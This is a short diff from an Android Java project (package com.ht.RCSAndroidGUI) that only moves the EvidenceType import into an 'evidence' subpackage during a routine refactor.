@@ -12,8 +12,8 @@ import java.nio.ByteOrder;
 
 import android.util.Log;
 
-import com.ht.RCSAndroidGUI.EvidenceType;
 import com.ht.RCSAndroidGUI.LogR;
+import com.ht.RCSAndroidGUI.evidence.EvidenceType;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
 // TODO: Auto-generated Javadoc
